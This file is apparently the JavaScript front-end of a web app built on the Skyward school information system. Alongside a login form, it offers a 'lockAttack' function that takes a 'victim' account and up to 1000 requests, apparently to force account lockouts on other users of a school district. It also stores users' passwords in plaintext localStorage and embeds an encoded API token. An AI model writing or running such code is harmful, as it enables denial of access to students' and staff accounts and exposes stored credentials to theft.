window.addEventListener('load', (event) => {
  if (!localStorage.username || !localStorage.password) return;
  document.querySelector('#username').value = localStorage.username || '';
  document.querySelector('#password').value = localStorage.password || '';
  document.querySelector('#skyward').value = localStorage.skyward || '';
  document.querySelector('#submit').click();
});

const app = new Vue({
  el: '#app',
  data: {
    loggedIn: false,
    tableRows: [],
    token: window.atob('NnZlblZxYUNyb1JnbnFTbkc2M282MmtCVHBzaGpkazlFUVVUQ1pmZkFUZWY='),
    skywardDefault: 'https://www2.swrdc.wa-k12.net/scripts/cgiip.exe/WService=wcamass71/fwemnu01',
  },
  methods: {
    login() {
      const username = document.querySelector('#username').value;
      const password = document.querySelector('#password').value;
      const skyward = document.querySelector('#skyward').value;
      if (username.length <= 1) {
        return alert('Please provide your username.');
      }
      if (password.length <= 1) {
        return alert('Please provide your password.');
      }
      const skywarder = new Skywarder(
        window.atob('NnZlblZxYUNyb1JnbnFTbkc2M282MmtCVHBzaGpkazlFUVVUQ1pmZkFUZWY='),
        skyward.length >= 1 ? skyward : this.skywardDefault
      );
      skywarder
        .login(username, password)
        .then(async (res) => {
          this.loggedIn = true;
          localStorage.username = username;
          localStorage.password = password;
          localStorage.skyward = skyward;
          // const { data } = await skywarder.getReport();
          // this.tableRows = data;
        })
        .catch((err) => {
          alert(err);
        });
    },
    forgot() {
      window.open(
        'https://www2.swrdc.wa-k12.net/scripts/cgiip.exe/WService=wcamass71/skyportforgot.w',
        '_blank'
      );
    },
    logout() {
      localStorage.username = null;
      localStorage.password = null;
      localStorage.skyward = null;
      window.location.reload();
    },
    lock() {
      const victim = document.querySelector('#victim').value;
      const requests = parseInt(document.querySelector('#requests').value);
      const district = document.querySelector('#district').value;
      if (requests > 1000 || requests < 1) return alert('Requests must be in between 1 and 1000');
      const skywarder = new Skywarder(
        window.atob('NnZlblZxYUNyb1JnbnFTbkc2M282MmtCVHBzaGpkazlFUVVUQ1pmZkFUZWY='),
        district
      );
      skywarder
        .login(localStorage.username, localStorage.password)
        .then(async (res) => {
          await skywarder.lockAttack(victim, requests || 30);
          alert(`Lock attack on ${victim} with ${requests || 30} requests initiated!`);
        })
        .catch((err) => {
          alert(err);
        });
    },
  },
});
